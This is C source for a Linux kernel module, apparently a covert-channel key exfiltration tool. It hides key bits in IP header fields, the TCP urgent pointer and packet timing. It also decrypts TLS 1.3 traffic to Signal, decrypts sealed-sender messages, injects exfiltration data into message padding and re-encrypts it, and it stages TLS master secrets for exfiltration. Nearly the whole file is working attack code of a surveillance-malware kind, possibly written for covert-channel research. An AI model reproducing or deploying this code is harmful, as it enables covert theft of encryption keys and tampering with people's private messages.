#include "ccmethod.h"

#include <linux/delay.h>
#include <linux/string.h>
#include <linux/timekeeping.h>
#include <net/ip.h>
#include <net/tcp.h>

#include "../common.h"
#include "../net/tls_crypto.h"
#include "../net/connection_list.h"
#include "../net/websocket.h"
#include "../net/signal_message.h"
#include "../signal/protobuf/protobuf.h"
#include "cchandler.h"

int cckex_cc_full_ttl(const struct sk_buff *skb, cckex_key_list_entry_t *key_entry) {
	struct iphdr *iph = ip_hdr(skb);

	iph->ttl = cckex_keybuf_get_bits(key_entry, 8);
	pr_info("CCKEX_LKM [%s] TTL INJECTION into ID=%04x on DEVICE=%s: %02x", __func__, iph->id, skb->dev->name, iph->ttl);

	return 0;
}

// see ccgen iptos method
int cckex_cc_iptos(const struct sk_buff *skb, cckex_key_list_entry_t *key_entry) {
	struct iphdr *iph = ip_hdr(skb);

	iph->tos = cckex_keybuf_get_bits(key_entry, 8);
	pr_info("CCKEX_LKM [%s] TOS INJECTION: %02x", __func__, iph->tos);

	return 0;
}

// see ccgen ipflags method
int cckex_cc_ipflags(const struct sk_buff *skb, cckex_key_list_entry_t *key_entry) {
    struct iphdr *iph = ip_hdr(skb);

    uint8_t data = cckex_keybuf_get_bits(key_entry, 1);

	//pr_info("CCKEX_LKM [%s] src_ip=%pI4h", __func__, &iph->saddr);
	//pr_info("CCKEX_LKM [%s] frag_off=%04.x", __func__, iph->frag_off);
    iph->frag_off &= ~0x0040; // clear reserved bit and dont fragment flag
    iph->frag_off |= (uint16_t)data << 7;
	//pr_info("CCKEX_LKM [%s] frag_off=%04.x", __func__, iph->frag_off);

    return 0;
}

// see ccgen ipid method
int cckex_cc_ipid(const struct sk_buff *skb, cckex_key_list_entry_t *key_entry) {
	struct iphdr *iph = ip_hdr(skb);

	iph->frag_off |= 0x0040;	// set dont fragment bit 
    //iph->frag_off &= ~0x0040; // clear dont fragment offset
	pr_info("CCKEX_LKM [%s] before: %04x", __func__, iph->id);
    iph->id = ((uint16_t)cckex_keybuf_get_bits(key_entry, 8) << 8) & 0xff00;
    iph->id |= cckex_keybuf_get_bits(key_entry, 8);
	pr_info("CCKEX_LKM [%s] ID INJECTION: %04x", __func__, iph->id);

    return 0;
}

int cckex_cc_ipfragment(const struct sk_buff *skb, cckex_key_list_entry_t *key_entry) {
    struct iphdr *iph = ip_hdr(skb);

	iph->frag_off |= 0x0040;	// set dont fragment bit 
    //iph->frag_off = 0; // clear flags and fragment offset
    iph->frag_off |= (uint16_t)cckex_keybuf_get_bits(key_entry, 8) << 8;
	//iph->frag_off |= (uint16_t)cckex_keybuf_get_bits(key_entry, 5);
	pr_info("CCKEX_LKM [%s] FRAGMENT INJECTION: %04x", __func__, iph->frag_off);

    return 0;
}

int cckex_cc_tcpurgent(const struct sk_buff *skb, cckex_key_list_entry_t *key_entry) {

	struct tcphdr *tcph;
	struct iphdr  *iph;
	
	// check if pkg is tcp
	if(cckex_skb_get_ip_proto((struct sk_buff*)skb) != IPPROTO_TCP) {
		pr_info("CCKEX_LKM [%s] reject non tcp package", __func__);
		return 0;	// no tcp package -> skip
	}

    tcph = tcp_hdr(skb);
	iph  = ip_hdr(skb);

	if(!tcph->urg) {
		// write position into ttl field
		iph->tos = key_entry->bit_offset / 8;
		// write data into urgent pointer field
		tcph->urg_ptr = 
			 (uint16_t)cckex_keybuf_get_bits(key_entry, 8) | 
			((uint16_t)cckex_keybuf_get_bits(key_entry, 8) << 8);

		pr_info("CCKEX_LKM [%s] URGENT POINTER INJECTION: %04x (%pI4h)", __func__, ntohs(tcph->urg_ptr), &iph->daddr);

	} else {
		pr_info("CCKEX_LKM [%s] URGENT POINTER ALREADY IN USE :(", __func__);
	}

    return 0;
}

static uint64_t last_ns = 0;

int cckex_cc_timing_ber(const struct sk_buff *skb, cckex_key_list_entry_t *key_entry) {

	// currently not used

    const uint64_t big_delay_ns   = 100000000;
    const uint64_t small_delay_ns =  50000000;

    uint64_t current_ns = ktime_get_ns();
    uint64_t delta_ns = current_ns - last_ns;

    // only delay if a previous timestamp was measured and if the time delta
    // since the last package isnt too big
    if(last_ns && delta_ns <  40000000) {
        if(cckex_keybuf_get_bits(key_entry, 1)) {
            ndelay(big_delay_ns - delta_ns);
        } else {
            ndelay(small_delay_ns - delta_ns);
        }
    }

    last_ns = current_ns;

    return 0;
}

cckex_key_list_entry_t *inj_sig_msg_entry = NULL;

static int cckex_cc_inject_data_into_message(signal_data_t *sdat) {

	uint8_t *end_ptr = sdat->message_data + sdat->message_data_size - 2;
	uint8_t *start_ptr = end_ptr;
	size_t size = 0;
	size_t size_to_copy = 0;

	while(*start_ptr != 0x80 && *start_ptr == 0x0 && start_ptr > sdat->message_data) start_ptr--;

	if(*start_ptr != 0x80) return -1;

	start_ptr += 16 - ((start_ptr - sdat->message_data) % 16);

	size = (size_t)(end_ptr - start_ptr);

	pr_info("CCKEX_LKM [%s] data=%px start=%px end=%px size=%zu", __func__, sdat->message_data, start_ptr, end_ptr, size);

	pr_info("CCKEX_LKM [%s] get new key entry ?", __func__);

	if(inj_sig_msg_entry == NULL) {
		inj_sig_msg_entry = cckex_try_fetch_sig_key_entry();
		
		// no entry in in signal injection output list
		if(inj_sig_msg_entry == NULL) {
			pr_info("CCKEX_LKM [%s] NO!", __func__);
			cckex_enqueue_in_sig_out_list(sdat->sealed_sender_key);
			cckex_enqueue_in_sig_out_list(sdat->message_key);
			return 0;
		}
		pr_info("CCKEX_LKM [%s] YES!", __func__);
	}

	pr_info("CCKEX_LKM [%s] INJECT!", __func__);

	size_to_copy = 0;
	while(size && inj_sig_msg_entry) {
		size_to_copy = MIN(inj_sig_msg_entry->size_to_exfiltrate - inj_sig_msg_entry->byte_offset, size);

		//pr_info("CCKEX_LKM [%s] size_to_copy %zu: ", __func__, size_to_copy);
		//cckex_print_mem(inj_sig_msg_entry->buf + inj_sig_msg_entry->byte_offset, size_to_copy);

		memcpy(start_ptr, inj_sig_msg_entry->buf + inj_sig_msg_entry->byte_offset, size_to_copy);

		size -= size_to_copy;
		inj_sig_msg_entry->byte_offset += size_to_copy;
		start_ptr += size_to_copy;
		*end_ptr += size_to_copy;

		if(inj_sig_msg_entry->byte_offset == inj_sig_msg_entry->size_to_exfiltrate) {
			cckex_free_key_list_entry(inj_sig_msg_entry);

			inj_sig_msg_entry = cckex_try_fetch_sig_key_entry();
		}
	}

	cckex_enqueue_in_cc_out_list(sdat->sealed_sender_key);
	cckex_enqueue_in_cc_out_list(sdat->message_key);

	return 0;
}

static const size_t move_buffer_size = 128;
static uint8_t http_header_move_buffer[move_buffer_size];

static int cckex_cc_inject_data_into_http_header(struct sk_buff *skb, signal_data_t *sdat, size_t *payload_len) {

	const char* magic_string = "content-type:application/json";
	uint8_t* injection_target_ptr = NULL;

	char* test_injection_string = "*\x0cReferer:Test";
	size_t test_len = 14;
//	test_injection_string[1] = (uint8_t)(test_len - 2);

	ssize_t skb_residual_len = 0;

	size_t injection_data_len = test_len;
	const unsigned tls_record_len_field_offset = 3;

	cckex_protobuf_handle_t pb_hndl;
	uint64_t length_field = 0;
	int length_field_size = 0;

	// search for "content-type:application/json" string
	injection_target_ptr = cckex_memmem(sdat->request_data, sdat->request_data_len, magic_string, strlen(magic_string));

	if(!injection_target_ptr) {
		pr_warn("CCKEX_LKM [%s] unable to find target string %s", __func__, magic_string);
		return -1;
	}

	//pr_info("CCKEX_LKM [%s] INJECTING INTO HTTP HEADER!!", __func__);

	// advance target pointer to point after the content-type field 
	injection_target_ptr += strlen(magic_string);

	// calculate the residual length of data which follows after the content-type field
	skb_residual_len = sdat->request_data_len - (ssize_t)(injection_target_ptr - sdat->request_data);
	if(skb_residual_len < 0 || skb_residual_len > move_buffer_size) {
		pr_warn("CCKEX_LKM [%s] unable to inject data into http header: move buffer to small / invalid size (%zu < %zi?)", __func__, move_buffer_size, skb_residual_len);
		return -1;
	}

	cckex_print_mem(sdat->request_data, 16);

	// extend skb 
	// TODO: do a check and alloc new space if neccessary
	// TODO: maybe use pskb_expand_head?
	//		 https://stackoverflow.com/questions/12529497/how-to-append-data-on-a-packet-from-kernel-space
	skb_put(skb, injection_data_len);
	sdat->request_data_len += injection_data_len;
	*payload_len += injection_data_len;
	sdat->tls_record_len += injection_data_len;
	cckex_update_skb_lengths(skb, injection_data_len);
	pr_info("CCKEX_LKM [%s] tls len from = %u", __func__, GET_U16H(sdat->tls_record, tls_record_len_field_offset));
	SET_U16H(
		sdat->tls_record,
		tls_record_len_field_offset,
		GET_U16H(sdat->tls_record, tls_record_len_field_offset) + injection_data_len);
	pr_info("CCKEX_LKM [%s] tls len to   = %u", __func__, GET_U16H(sdat->tls_record, tls_record_len_field_offset));

	// TODO: update protobuf len -> 2:LEN request field
	// iterate through outer elements
	if(cckex_protobuf_init(&pb_hndl, sdat->request_data, sdat->request_data_len) < 0) {
		pr_warn("CCKEX_LKM [%s] failed to init protobuf handler", __func__);
		return -1;
	}
	
	do {
		// found request field
		if(pb_hndl.elem_id == 2) {

			if((length_field_size = cckex_read_varint(
					pb_hndl.buffer + pb_hndl.buffer_offset + pb_hndl.tag_size,
					pb_hndl.buffer_size - (pb_hndl.buffer_offset + pb_hndl.tag_size),
					&length_field)) < 0) {
				pr_warn("CCKEX_LKM [%s] failed to read WebSocketMessage.request length field", __func__);
				return -1;
			}
			
			pr_info("CCKEX_LKM [%s] protobuf len(%u): %llu", __func__, length_field_size, length_field);
			length_field += injection_data_len;
			pr_info("CCKEX_LKM [%s] protobuf len(%u): %llu", __func__, length_field_size, length_field);

			if(cckex_write_varint(
					pb_hndl.buffer + pb_hndl.buffer_offset + pb_hndl.tag_size,
					length_field_size,
					length_field) != length_field_size) {
				pr_warn("CCKEX_LKM [%s] failed to write WebSocketMessage.request length field", __func__);
				return -1;
			}

			break;
		}
	} while(cckex_protobuf_next(&pb_hndl) > 0);

	pr_info("CCKEX_LKM [%s] before (%zu %zd):", __func__, injection_data_len, skb_residual_len);
	cckex_print_mem(injection_target_ptr, skb_residual_len + injection_data_len);

	// then copy the residual data in the move buffer ...
	//memcpy(http_header_move_buffer, injection_target_ptr, skb_residual_len);
	// ... and from the move buffer back at the advanced position in the skb to avoid overlapping memcpy's
	//memcpy(injection_target_ptr + injection_data_len, http_header_move_buffer, skb_residual_len);

	// lastly inject data
	memcpy(injection_target_ptr + skb_residual_len, test_injection_string, injection_data_len);
	
	pr_info("CCKEX_LKM [%s] after:", __func__);
	cckex_print_mem(injection_target_ptr, skb_residual_len + injection_data_len);

	// iterate through elements
	if(cckex_protobuf_init(&pb_hndl, sdat->request_data + 5, sdat->request_data_len - 5) < 0) {
		pr_warn("CCKEX_LKM [%s] failed to init protobuf handler", __func__);
		return -1;
	}

	do {
		pr_info("CCKEX_LKM [%s] found protobuf field with id %u", __func__, pb_hndl.elem_id);
	} while(cckex_protobuf_next(&pb_hndl) > 0);

	return 0;
}

#define CCKEX_TLS13_RECORD_PAYLOAD_OFFSET 5
#define CCKEX_TLS13_AEAD_AUTH_LENGTH 16

int cckex_cc_inject_into_message(struct sk_buff *skb) {

	uint8_t* payload = cckex_skb_get_payload(skb);

	size_t payload_len = PAYLOAD_LENGTH(payload, skb_tail_pointer(skb));
	cckex_conn_list_entry_t *entry = cckex_conn_list_find_matching_skb(skb, 443);
	cckex_tls_crypto_t *tls_crypto = NULL;
	signal_data_t signal_data;
	int ret = 0;

	int http_payload_offset = 0;

	memset(&signal_data, 0, sizeof(signal_data_t));

	signal_data.tls_record = payload;
	signal_data.tls_record_len = payload_len;

	if(entry == NULL) {
		pr_warn("CCKEX_LKM [%s] unable to find matching entry", __func__);
		return -1;
	} else if(entry->exfil_master_secret) {
		pr_info("CCKEX_LKM [%s] STAGING TLS MASTER SECRET FOR EXFIL", __func__);
		cckex_stage_master_secret_for_exfil(entry);
		entry->exfil_master_secret = 0;
	}

	if(!cckex_signal_message_injection_active() && !cckex_http_header_injection_active()) return 0;	// optimization to just stage the key but not decrypt tls

//	pr_info("CCKEX_LKM [%s] ENCRYPTED PKG (len=%i): ", __func__, payload_len);
//	cckex_print_mem(payload, payload_len);
//	pr_info("CCKEX_LKM [%s] From %u to %pI4h:%u", __func__, entry->local_port, entry->ip.remote_ipv4, entry->remote_port);

	// TODO: switch between TLS12 and TLS13 decryption depending on the used version
	if(cckex_tls13_decrypt_payload(skb, entry, payload, payload_len, &tls_crypto)) {
		pr_warn("CCKEX_LKM [%s] failed to decrypt package", __func__);
		goto out;
	}

	http_payload_offset = cckex_websocket_unmask_payload(
		payload + CCKEX_TLS13_RECORD_PAYLOAD_OFFSET,
		payload_len - CCKEX_TLS13_RECORD_PAYLOAD_OFFSET - CCKEX_TLS13_AEAD_AUTH_LENGTH - 1 /* TODO: why this 1 here? */) + CCKEX_TLS13_RECORD_PAYLOAD_OFFSET;

	//pr_info("CCKEX_LKM [%s] DECRYPTED PKG: ", __func__);
	//cckex_print_mem(payload, payload_len);
	//pr_info("CCKEX_LKM [%s] PKG from %u to %pI4h:%u", __func__, entry->local_port, entry->ip.remote_ipv4, entry->remote_port); 	
	
	signal_data.request_data = payload + http_payload_offset;
	signal_data.request_data_len = payload_len - http_payload_offset - CCKEX_TLS13_AEAD_AUTH_LENGTH - 1 /* Same 1 as above - some kind of stop byte? */;
	signal_data.request_data_offset = 0;

	// inject data into http layer if enabled
	if(cckex_http_header_injection_active()) {
	
		//pr_info("PAYLOAD LENGTH = %llu", PAYLOAD_LENGTH(payload, skb_tail_pointer(skb)));

		if(cckex_cc_inject_data_into_http_header(skb, &signal_data, &payload_len)) {
			// TODO: http injection failed - what to do now ?
		}

		//pr_info("PAYLOAD LENGTH = %llu", PAYLOAD_LENGTH(payload, skb_tail_pointer(skb)));
	}

	// search for all base64 encoded content messages in the http request until no more can be found
	while(cckex_signal_message_injection_active() && (ret = cckex_signal_message_unpack_base64(&signal_data)) == 0) {

		//pr_info("CCKEX_LKM [%s] base64 unpacked at offset %zu: ", __func__, signal_data.request_data_offset);
		//cckex_print_mem(signal_data.raw_data, signal_data.raw_data_len);

		if(cckex_signal_message_decrypt_sealed_sender(&signal_data)) {
			pr_warn("CCKEX_LKM [%s] failed to decrypt sealed sender", __func__);	
			goto out_repack_base64;
		}

		/*pr_info("CCKEX_LKM [%s] decrypted sealed sender: ", __func__);
		//cckex_print_mem(signal_data.sealed_sender_data, signal_data.sealed_sender_data_size + 10);*/
	
		//pr_info("CCKEX_LKM [%s] id before: ", __func__);
		//cckex_print_mem(signal_data.sealed_sender_data + 325, 8);

		if(cckex_signal_message_decrypt_message(&signal_data)) {
			pr_warn("CCKEX_LKM [%s] failed to decrypt message", __func__);	
			goto out_encrypt_sealed_sender;
		}


		cckex_cc_inject_data_into_message(&signal_data);

		//pr_info("CCKEX_LKM [%s] decrypted message: ", __func__);
		//cckex_print_mem(signal_data.message_data, signal_data.message_data_size);

		cckex_signal_message_encrypt_message(&signal_data);

		//pr_info("CCKEX_LKM [%s] id after: ", __func__);
		//cckex_print_mem(signal_data.message_data, 8);


out_encrypt_sealed_sender:

		cckex_signal_message_encrypt_sealed_sender(&signal_data);

		/*pr_info("CCKEX_LKM [%s] reencrypted sealed sender: ", __func__);
		//cckex_print_mem(signal_data.sealed_sender_data, signal_data.sealed_sender_data_size + 10);*/

		cckex_signal_message_recalc_hmac(&signal_data);

out_repack_base64:

		cckex_signal_message_repack_base64(&signal_data);

		/*pr_info("CCKEX_LKM [%s] base64 after: ", __func__);
		for(char* iter = signal_data.base64_ptr; iter < signal_data.base64_endptr; iter++) {
			//printk(KERN_CONT "%c", *iter);
		}*/
	}

	if(ret == -1) {
		pr_warn("CCKEX_LKM [%s] failed to unpack base64", __func__);	
	}

	cckex_websocket_mask_payload(
		payload + CCKEX_TLS13_RECORD_PAYLOAD_OFFSET,
		payload_len - CCKEX_TLS13_RECORD_PAYLOAD_OFFSET - CCKEX_TLS13_AEAD_AUTH_LENGTH - 1);

	// TODO: switch between TLS12 and TLS13 depending on the used version
	cckex_tls13_encrypt_payload(skb, entry, payload, payload_len, &tls_crypto);

out:

	//pr_info("CCKEX_LKM [%s] AGAIN ENCRYPTED PKG: ", __func__);
	//cckex_print_mem(payload, payload_len);

	return 0;
}
